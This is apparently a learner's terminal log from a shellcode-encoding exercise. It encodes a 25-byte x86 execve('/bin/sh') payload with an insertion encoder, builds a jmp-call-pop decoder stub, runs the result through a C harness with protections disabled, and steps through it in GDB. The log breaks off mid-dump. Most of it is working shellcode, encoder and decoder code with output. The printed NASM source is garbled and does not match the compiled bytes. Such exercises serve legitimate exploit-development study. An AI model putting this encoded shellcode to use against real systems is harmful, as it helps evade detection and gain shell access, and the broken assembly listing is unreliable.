@@ -1,0 +1,2262 @@
+Writing a Custom Insertion Encoder
+
+1.) Assemble and run
+kan1shka9@dev:~/Desktop/Remain/31$ ls
+execve-stack-sh  Insertion_encoder.py  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/31$ objdump -d ./execve-stack-sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+kan1shka9@dev:~/Desktop/Remain/31$ nano shellcode.c
+kan1shka9@dev:~/Desktop/Remain/31$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+kan1shka9@dev:~/Desktop/Remain/31$ ./shellcode
+Shellcode length: 25
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:04 bash
+ 6338 pts/9    00:00:00 sh
+ 6339 pts/9    00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/31$ nano Insertion_encoder.py
+kan1shka9@dev:~/Desktop/Remain/31$ cat -n Insertion_encoder.py
+     1  #!/usr/bin/python
+     2
+     3  # Python Complement Encoder
+     4  import random
+     5
+     6  shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+     7
+     8  encoded = ""
+     9  encoded2 = ""
+    10
+    11  print 'Encoded shellcode ...'
+    12
+    13  for x in bytearray(shellcode) :
+    14          encoded += '\\x'
+    15          encoded += '%02x' % x
+    16          encoded += '\\%02x' % 0xAA
+    17
+    18          # encoded += '\\x%02x' % random.randint(1,255)
+    19
+    20          encoded2 += '0x'
+    21          encoded2 += '%02x,' %x
+    22          encoded2 += '0x%02x,' % 0xAA
+    23
+    24          # encoded2 += '0x%02x,' % random.randint(1,255)
+    25
+    26  print encoded
+    27
+    28  print encoded2
+    29
+    30  print 'Len: %d' % len(bytearray(shellcode))
+kan1shka9@dev:~/Desktop/Remain/31$ python Insertion_encoder.py
+Encoded shellcode ...
+\x31\aa\xc0\aa\x50\aa\x68\aa\x2f\aa\x2f\aa\x73\aa\x68\aa\x68\aa\x2f\aa\x62\aa\x69\aa\x6e\aa\x89\aa\xe3\aa\x50\aa\x89\aa\xe2\aa\x53\aa\x89\aa\xe1\aa\xb0\aa\x0b\aa\xcd\aa\x80\aa
+0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa,
+Len: 25
+kan1shka9@dev:~/Desktop/Remain/31$ ls
+compile_ld.sh  execve-stack-sh  insertion-decoder.nasm  Insertion_encoder.py  shellcode  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/31$ ./compile_ld.sh insertion-decoder
+[+] Assebling with Nasm ...
+[+] Linking ...
+[+] Done!
+kan1shka9@dev:~/Desktop/Remain/31$ ls
+compile_ld.sh    insertion-decoder       insertion-decoder.o   shellcode
+execve-stack-sh  insertion-decoder.nasm  Insertion_encoder.py  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/31$ objdump -d insertion-decoder -M intel
+
+insertion-decoder:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       eb 1d                   jmp    804807f <call_shellcode>
+
+08048062 <decoder>:
+ 8048062:       5e                      pop    esi
+ 8048063:       8d 7e 01                lea    edi,[esi+0x1]
+ 8048066:       31 c0                   xor    eax,eax
+ 8048068:       b0 01                   mov    al,0x1
+ 804806a:       31 db                   xor    ebx,ebx
+
+0804806c <decode>:
+ 804806c:       8a 1c 06                mov    bl,BYTE PTR [esi+eax*1]
+ 804806f:       80 f3 aa                xor    bl,0xaa
+ 8048072:       75 10                   jne    8048084 <EncodedShellcode>
+ 8048074:       8a 5c 06 01             mov    bl,BYTE PTR [esi+eax*1+0x1]
+ 8048078:       88 1f                   mov    BYTE PTR [edi],bl
+ 804807a:       47                      inc    edi
+ 804807b:       04 02                   add    al,0x2
+ 804807d:       eb ed                   jmp    804806c <decode>
+
+0804807f <call_shellcode>:
+ 804807f:       e8 de ff ff ff          call   8048062 <decoder>
+
+08048084 <EncodedShellcode>:
+ 8048084:       31 aa c0 aa 50 aa       xor    DWORD PTR [edx-0x55af5540],ebp
+ 804808a:       68 aa 2f aa 2f          push   0x2faa2faa
+ 804808f:       aa                      stos   BYTE PTR es:[edi],al
+ 8048090:       73 aa                   jae    804803c <_start-0x24>
+ 8048092:       68 aa 68 aa 2f          push   0x2faa68aa
+ 8048097:       aa                      stos   BYTE PTR es:[edi],al
+ 8048098:       62 aa 69 aa 6e aa       bound  ebp,QWORD PTR [edx-0x55915597]
+ 804809e:       89 aa e3 aa 50 aa       mov    DWORD PTR [edx-0x55af551d],ebp
+ 80480a4:       89 aa e2 aa 53 aa       mov    DWORD PTR [edx-0x55ac551e],ebp
+ 80480aa:       89 aa e1 aa b0 aa       mov    DWORD PTR [edx-0x554f551f],ebp
+ 80480b0:       0b aa cd aa 80 aa       or     ebp,DWORD PTR [edx-0x557f5533]
+ 80480b6:       bb                      .byte 0xbb
+ 80480b7:       bb                      .byte 0xbb
+kan1shka9@dev:~/Desktop/Remain/31$ objdump -d ./insertion-decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb"
+kan1shka9@dev:~/Desktop/Remain/31$ ls
+compile_ld.sh  execve-stack-sh  insertion-decoder  insertion-decoder.nasm  insertion-decoder.o  Insertion_encoder.py  shellcode  shellcode.c
+kan1shka9@dev:~/Desktop/Remain/31$ cp shellcode.c shellcode-insertion.c
+kan1shka9@dev:~/Desktop/Remain/31$ ls
+compile_ld.sh  execve-stack-sh  insertion-decoder  insertion-decoder.nasm  insertion-decoder.o  Insertion_encoder.py  shellcode  shellcode.c  shellcode-insertion.c
+kan1shka9@dev:~/Desktop/Remain/31$ nano shellcode-insertion.c
+kan1shka9@dev:~/Desktop/Remain/31$ cat -n shellcode-insertion.c
+     1  #include<stdio.h>
+     2  #include<string.h>
+     3
+     4  unsigned char code[] = \
+     5  "\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb";
+     6
+     7  main()
+     8  {
+     9
+    10      printf("Shellcode length: %d\n", strlen(code));
+    11
+    12      int (*ret)() = (int(*)())code;
+    13
+    14      ret();
+    15
+    16  }
+kan1shka9@dev:~/Desktop/Remain/31$ gcc -fno-stack-protector -z execstack shellcode-insertion.c -o shellcode-insertion
+kan1shka9@dev:~/Desktop/Remain/31$ ls
+compile_ld.sh  execve-stack-sh  insertion-decoder  insertion-decoder.nasm  insertion-decoder.o  Insertion_encoder.py  shellcode  shellcode.c  shellcode-insertion  shellcode-insertion.c
+kan1shka9@dev:~/Desktop/Remain/31$ ./shellcode-insertion
+Shellcode length: 88
+$ ps
+  PID TTY          TIME CMD
+ 3373 pts/9    00:00:05 bash
+ 6742 pts/9    00:00:00 sh
+ 6743 pts/9    00:00:00 ps
+$ exit
+kan1shka9@dev:~/Desktop/Remain/31$
+
+2.) Analyse using GDB
+kan1shka9@dev:~/Desktop/Remain/31$ gdb -q ./shellcode-insertion
+Reading symbols from ./shellcode-insertion...(no debugging symbols found)...done.
+(gdb) set disassembly-flavor intel
+(gdb) break *&code
+Breakpoint 1 at 0x804a040
+(gdb) run
+Starting program: /home/kan1shka9/Desktop/Remain/31/shellcode-insertion
+Shellcode length: 88
+
+Breakpoint 1, 0x0804a040 in code ()
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+(gdb) x/20xb 0x0804a064
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+(gdb) shell cat insertion-decoder.nasm
+; insertion-decoder.nasm
+
+global _start
+
+section .text
+_start:
+
+        jmp short call_shellcode
+
+decoder:
+        pop esi
+        lea edi, [esi +1]
+        xor eax, eax
+        mov al, 1
+        xor ebx, ebx
+
+decode:
+        mov bl, byte [esi + eax]
+        xor bl, 0xaa
+        jnz short EncodedShellcode
+        mov bl, byte [esi + eax + 1]
+        mov byte [edi], bl
+        inc edi
+        add al, 2
+        jmp short decode
+
+call_shellcode:
+
+        call decoder
+        EncodedShellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0a,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa,0xbb,0xbb
+(gdb) break *0x0804a064
+Breakpoint 2 at 0x804a064
+(gdb) disassemble
+Dump of assembler code for function code:
+=> 0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>disassemble
+>x/20xb 0x0804a064
+>end
+(gdb) stepi
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+=> 0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a05f in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+=> 0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a042 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+=> 0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a043 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+=> 0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a046 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+=> 0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a048 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+=> 0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a04a in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+=> 0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a04c in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+=> 0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
